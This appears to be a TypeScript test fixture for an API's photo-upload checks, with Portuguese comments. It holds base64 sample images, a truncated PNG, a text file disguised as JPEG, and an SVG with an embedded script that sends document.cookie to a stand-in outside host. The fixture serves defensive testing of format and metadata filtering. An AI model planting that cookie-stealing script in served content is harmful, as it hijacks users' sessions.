/**
 * Imagens de verdade, pequenas, para os testes de envio de foto.
 *
 * Geradas uma vez com o próprio sharp e coladas aqui em base64. Ficam no repositório em vez de
 * serem geradas na hora por um motivo: gerar exigiria o sharp instalado na raiz do monorepo, e
 * ele é dependência da API. Um teste que precisa da dependência do que ele testa para montar a
 * entrada testa menos do que parece.
 */

/**
 * A sonda. Está gravada no EXIF da JPEG abaixo, junto com coordenadas de GPS.
 *
 * Se esta palavra aparecer nos bytes que a API devolve, o metadado sobreviveu ao
 * processamento — e uma selfie tirada em casa publicaria o endereço de quem a tirou.
 */
export const SONDA_DE_EXIF = 'MODELO-SECRETO';

/** JPEG 240x320, com EXIF de marca, modelo e GPS. */
const JPEG_COM_EXIF_B64 =
  '/9j/4QDyRXhpZgAASUkqAAgAAAAIAA8BAgAOAAAAfgAAABABAgAPAAAAjAAAABIBAwABAAAAAQAAABoBBQABAAAAbgAAAB' +
  'sBBQABAAAAdgAAACgBAwABAAAAAgAAABMCAwABAAAAAQAAAGmHBAABAAAAnAAAAAAAAAA4YwAA6AMAADhjAADoAwAATUFS' +
  'Q0EtU0VDUkVUQQBNT0RFTE8tU0VDUkVUTwAABgAAkAcABAAAADAyMTABkQcABAAAAAECAwAAoAcABAAAADAxMDABoAMAAQ' +
  'AAAP//AAACoAQAAQAAAPAAAAADoAQAAQAAAEABAAAAAAAA/9sAQwAKBwcIBwYKCAgICwoKCw4YEA4NDQ4dFRYRGCMfJSQi' +
  'HyIhJis3LyYpNCkhIjBBMTQ5Oz4+PiUuRElDPEg3PT47/9sAQwEKCwsODQ4cEBAcOygiKDs7Ozs7Ozs7Ozs7Ozs7Ozs7Oz' +
  's7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7/8AAEQgBQADwAwEiAAIRAQMRAf/EABUAAQEAAAAAAAAAAAAAAAAA' +
  'AAAF/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/EABYBAQEBAAAAAAAAAAAAAAAAAAAFBv/EABQRAQAAAAAAAAAAAAAAAAAAAA' +
  'D/2gAMAwEAAhEDEQA/AIoCO24AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
  'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
  'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
  'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
  'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
  'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
  'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//Z';

/** PNG 64x64, sem metadado nenhum. */
const PNG_B64 =
  'iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAIAAAAlC+aJAAAACXBIWXMAAAPoAAAD6AG1e1JrAAAAn0lEQVRoge2SQQkAQRDD' +
  '6ia2qnA1noh7hIFCBKSh4fU00Q3YgOoV2YV6l+gGbED1iuxCvUt0AzagekV2od4lugEbUL0iu1DvEt2ADahekV2od4luwAZU' +
  'r8gu1LtEN2ADqldkF+pdohuwAdUrsgv1LtEN2IDqFdmFepfoBmxA9YrsQr1LdAM2oHpFdqHeJboBG1C9IrtQ7xLdgA2oXvEP' +
  'H+5PUR590ltSAAAAAElFTkSuQmCC';

/** GIF 1x1. O sharp abre GIF sem reclamar — a recusa tem que ser nossa, e é. */
const GIF_B64 = 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';

export const JPEG_COM_EXIF = Buffer.from(JPEG_COM_EXIF_B64, 'base64');
export const PNG = Buffer.from(PNG_B64, 'base64');
export const GIF = Buffer.from(GIF_B64, 'base64');

/**
 * A mesma PNG, cortada no meio: cabeçalho íntegro, pixels incompletos.
 *
 * É o que um envio interrompido pela rede produz, e é o caso que separa **ler o cabeçalho** de
 * **decodificar a imagem** — o `metadata()` do sharp passa, e a decodificação falha depois.
 */
export const PNG_CORTADO = PNG.subarray(0, Math.floor(PNG.length * 0.6));

/**
 * Um SVG bem formado, com dimensões e script dentro.
 *
 * **O sharp aceita este arquivo** — conferido em 2026-08-25, com sharp 0.35.3, e é a razão de a
 * lista de formatos existir. Servido do nosso domínio como `image/svg+xml`, ele seria script
 * rodando na origem da plataforma, com acesso ao que aquela origem tem.
 */
export const SVG_COM_SCRIPT = Buffer.from(
  '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">' +
    '<script>fetch("https://ladodefora.example/" + document.cookie)</script>' +
    '<rect width="100" height="100" fill="red"/></svg>',
);

/**
 * Texto puro. É enviado com nome `.jpg` e tipo `image/jpeg` — os dois são escolhidos por quem
 * envia, e não provam nada sobre o que o arquivo é.
 */
export const TEXTO_DISFARCADO = Buffer.from('isto aqui nao e uma imagem, e um arquivo de texto');
